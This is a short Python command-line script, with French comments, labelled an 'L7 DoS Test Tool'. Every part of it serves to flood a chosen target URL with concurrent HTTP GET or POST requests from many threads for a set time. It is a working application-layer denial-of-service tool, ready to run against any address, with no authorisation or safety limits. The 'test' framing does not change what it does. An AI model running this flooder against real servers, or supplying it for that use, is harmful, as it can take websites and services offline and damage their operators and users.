#!/usr/bin/env python3
import threading
import time
import requests
import argparse

# Envoi GET
def launch_get_requests(url, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            requests.get(url)
        except:
            pass

# Envoi POST
def launch_post_requests(url, data, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            requests.post(url, data=data)
        except:
            pass

# Parser CLI
parser = argparse.ArgumentParser(description="L7 DoS Test Tool (GET/POST)")
parser.add_argument("--target", required=True, help="Target URL (e.g. http://192.168.1.10/)")
parser.add_argument("--method", required=True, choices=["get", "post"], help="HTTP method to test")
parser.add_argument("--duration", type=int, default=10, help="Duration in seconds")
parser.add_argument("--threads", type=int, default=50, help="Number of concurrent threads")
args = parser.parse_args()

# Lancement
threads = []
print(f"[+] Starting {args.method.upper()} DoS on {args.target} for {args.duration} seconds with {args.threads} threads")

for _ in range(args.threads):
    if args.method == "get":
        t = threading.Thread(target=launch_get_requests, args=(args.target, args.duration))
    else:
        t = threading.Thread(target=launch_post_requests, args=(args.target, {"data": "L7_ATTACK"}, args.duration))
    t.daemon = True
    t.start()
    threads.append(t)

# Attente fin
for t in threads:
    t.join()

print("[+] Test finished.")
